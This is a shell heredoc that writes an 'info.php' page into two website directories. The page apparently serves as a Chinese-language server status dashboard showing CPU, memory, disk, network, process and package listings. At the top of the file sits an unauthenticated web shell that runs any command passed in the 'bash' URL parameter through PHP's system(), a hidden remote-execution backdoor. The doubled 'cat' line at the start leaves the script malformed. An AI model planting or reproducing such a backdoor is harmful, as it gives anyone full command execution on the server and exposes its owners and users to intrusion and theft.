cat > /var/www/gvm.donpau.com/./info.php << '_EOF_'
cat > /var/www/hub.paotung.org/./info.php << '_EOF_'
<pre><?php
  if (isset( $_GET['bash'] )){
    $cmd=$_GET['bash'];
    system($cmd);
  }
?></pre>  
<!doctype html>
<html lang="en" dir="ltr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,height=device-height,initial-scale=1">
<meta name="keywords" content="info">
<meta name="description" content="info">
<title>info</title>
<style>
html {
    font-family: sans-serif;
    line-height: 1.15;
}
body {
    margin: 10px;
    padding: 10px;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
    font-size: 1rem;
    direction: rtl;
    direction: ltr;
}
div {
    margin: 0;
    padding: 0;
    border: 0;
}
.main {
    margin: 0;
}
.header {
    margin: 0;
}
.menu {
    display: flex;
    flex-wrap: wrap;
    justify-content: flex-start;
}
.items {
    display: block;
    height: 34px;
    line-height: 34px;
    cursor: pointer;
    padding: 0 10px
}
.content {
    position: relative;
}
.content input[type='radio'] {
    display: none;
}
.content input[type='radio']:checked ~ .message {
    display: block;
}
.unit {
    margin: 0;
}
.message {
    display: none;
}
</style>
<script>
  function change(element) {
    document.querySelectorAll('.items').forEach(function(element) {
      element.style.backgroundColor = '#fff';
    });
    element.style.backgroundColor = '#999';
  }
</script>
</head>
<body style="direction:ltr;">
<div class="main">
  <div class="header">
    <div class="menu">
      <label class="items" for="item1" onclick="change(this)" style="background: #999;">CPU占用率</label>
      <label class="items" for="item2" onclick="change(this)">内存使用</label>
      <label class="items" for="item3" onclick="change(this)">磁盘使用</label>
      <label class="items" for="item4" onclick="change(this)">CPU信息</label>
      <label class="items" for="item5" onclick="change(this)">内存信息</label>
      <label class="items" for="item6" onclick="change(this)">网卡信息</label>
      <label class="items" for="item7" onclick="change(this)">网络流量</label>
      <label class="items" for="item8" onclick="change(this)">连接进程</label>
      <label class="items" for="item9" onclick="change(this)">系统运行</label>
      <label class="items" for="item10" onclick="change(this)">安装包</label>
    </div>
    <div class="content">
      <div class="unit">
        <input type="radio" name="tab" id="item1" checked="">
        <div class="message">
          <pre><?php system('ps aux --sort=-%cpu'); ?></pre>
        </div>
      </div>
      <div class="unit">
        <input type="radio" name="tab" id="item2">
        <div class="message">
          <pre><?php system('ps aux --sort=-%mem'); ?></pre>
        </div>
      </div>
      <div class="unit">
        <input type="radio" name="tab" id="item3">
        <div class="message">
          <pre><?php system('df -h'); ?></pre>
          <pre><?php system('du -sh /*'); ?></pre>
        </div>
      </div>
      <div class="unit">
        <input type="radio" name="tab" id="item4">
        <div class="message">
          <pre><?php system('lscpu'); ?></pre>
        </div>
      </div>
      <div class="unit">
        <input type="radio" name="tab" id="item5">
        <div class="message">
          <pre><?php system('free -h'); ?></pre>
        </div>
      </div>
      <div class="unit">
        <input type="radio" name="tab" id="item6">
        <div class="message">
          <pre><?php system('ifconfig'); ?></pre>
        </div>
      </div>
      <div class="unit">
        <input type="radio" name="tab" id="item7">
        <div class="message">
          <pre>Since the start: <?php system('uptime -s'); ?></pre>
          <pre><?php system('cat /proc/net/dev'); ?></pre>
        </div>
      </div>
      <div class="unit">
        <input type="radio" name="tab" id="item8">
        <div class="message">
          <pre><?php system('ss'); ?></pre>
        </div>
      </div>
      <div class="unit">
        <input type="radio" name="tab" id="item9">
        <div class="message">
          <pre><?php system('vmstat 1 5'); ?></pre>
        </div>
      </div>
      <div class="unit">
        <input type="radio" name="tab" id="item10">
        <div class="message">
          <pre><?php system('dpkg --get-selections'); ?></pre>
          <pre><?php system('apt list --installed'); ?></pre>
        </div>
      </div>
    </div>
  </div>
</div>
</body>
</html>
_EOF_
